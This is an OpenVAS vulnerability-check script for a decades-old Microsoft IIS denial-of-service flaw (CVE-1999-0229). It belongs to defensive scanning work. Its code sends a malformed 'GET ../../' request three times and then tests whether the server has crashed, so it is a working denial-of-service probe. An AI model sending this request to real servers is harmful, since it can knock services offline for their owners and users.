###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_ms_iis_get_request_dos_vuln.nasl 14117 2019-03-12 14:02:42Z cfischer $
#
# Microsoft IIS GET Request Denial of Service Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:microsoft:iis';

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902914");
  script_version("$Revision: 14117 $");
  script_cve_id("CVE-1999-0229");
  script_bugtraq_id(2218);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"$Date: 2019-03-12 15:02:42 +0100 (Tue, 12 Mar 2019) $");
  script_tag(name:"creation_date", value:"2012-05-22 12:45:33 +0530 (Tue, 22 May 2012)");
  script_name("Microsoft IIS GET Request Denial of Service Vulnerability");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/1638");
  script_xref(name:"URL", value:"http://en.securitylab.ru/nvd/246425.php");
  script_xref(name:"URL", value:"http://www.iss.net/security_center/reference/vuln/HTTP_DotDot.htm");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2012 SecPod");
  script_family("Web Servers");
  script_require_ports("Services/www", 80);
  script_dependencies("secpod_ms_iis_detect.nasl");
  script_mandatory_keys("IIS/installed");

  script_tag(name:"impact", value:"Successful exploitation will let the remote unauthenticated attackers
  to force the IIS server to become unresponsive until the IIS service
  is restarted manually by the administrator.");
  script_tag(name:"affected", value:"Microsoft Internet Information Server 2.0 and prior on Microsoft Windows NT");
  script_tag(name:"insight", value:"The flaw is due to an error in the handling of HTTP GET requests that
  contain a tunable number of '../' sequences in the URL.");
  script_tag(name:"solution", value:"Upgrade to latest version of IIS and latest Microsoft Service Packs.");

  script_tag(name:"summary", value:"The host is running Microsoft IIS Webserver and is prone to
  denial of service vulnerability.");

  script_tag(name:"qod_type", value:"exploit");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");

if(!iisPort = get_app_port(cpe:CPE)) exit(0);

## Send attack request multiple time
for(i=0; i<3; i++){
  res =  http_send_recv(port: iisPort, data: 'GET ../../\r\n');
}

sleep(3);

if(http_is_dead(port:iisPort) && !res){
  security_message(port:iisPort);
  exit(0);
}

exit(99);